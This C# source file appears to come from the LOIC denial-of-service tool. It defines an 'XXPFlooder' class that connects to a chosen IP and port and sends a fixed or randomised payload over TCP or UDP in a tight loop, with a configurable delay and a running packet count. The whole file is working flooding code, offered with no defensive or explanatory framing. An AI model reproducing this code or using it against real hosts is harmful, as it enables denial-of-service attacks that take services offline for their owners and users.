namespace LOIC
{
	#region using directives
	using System.Net;
	using System.Net.Sockets;
	using System.Text;
	#endregion

	enum TargetProtocol
	{
		Undefined = 0x0,
		TCP = 0x1,
		UDP = 0x2,
		HTTP = 0x3
	};
	
	public class XXPFlooder : BaseFlooder
	{		
		#region Fields
		public int FloodCount { get; set; }
		
		public string IP { get; set; }
		public int Port { get; set; }
		
		public int Protocol { get; set; }
		public int Delay { get; set; }
		public bool Resp { get; set; }
		public string Data { get; set; }

		private bool random;
		private byte[] buffer;
		private IPEndPoint remoteHost;
		#endregion

		#region Constructor
		public XXPFlooder (string ip, int port, int proto, int delay, bool resp, string data, bool random)
			: base()
		{
			this.IP = ip;
			this.Port = port;
			this.Protocol = proto;
			this.Delay = delay;
			this.Resp = resp;
			this.Data = data;
			this.random = random;
		}
		#endregion

		#region Methods
		protected override void OnStart ()
		{
			if (random) {
				buffer = Encoding.ASCII.GetBytes (string.Format (Data, new Functions ().RandomString ()));
			} else {
				buffer = Encoding.ASCII.GetBytes (Data);
			}
			
			remoteHost = new IPEndPoint (IPAddress.Parse (IP), Port);
		}

		protected override void OnRun()
		{
			try {
				Socket socket = null;
				if (Protocol == 1) {
					socket = new Socket (AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
					socket.NoDelay = true;
					
					// Connect
					while (IsFlooding) {
						try {
							socket.Connect (remoteHost);
						} catch {
							continue;
						}
						break;
					}
					
					socket.Blocking = Resp;
					try {
						// Flood
						while (IsFlooding) {
							FloodCount++;
							socket.Send (buffer);
							if (Delay >= 0)
								System.Threading.Thread.Sleep (Delay + 1);
						}
					} catch {
					}
				} else if (Protocol == 2) {
					socket = new Socket (AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
					socket.Blocking = Resp;
					try {
						// Flood
						while (IsFlooding) {
							FloodCount++;
							socket.SendTo (buffer, SocketFlags.None, remoteHost);
							if (Delay >= 0)
								System.Threading.Thread.Sleep (Delay + 1);
						}
					} catch {
					}
				}
			} catch {
			}
		}
		#endregion
	}
}
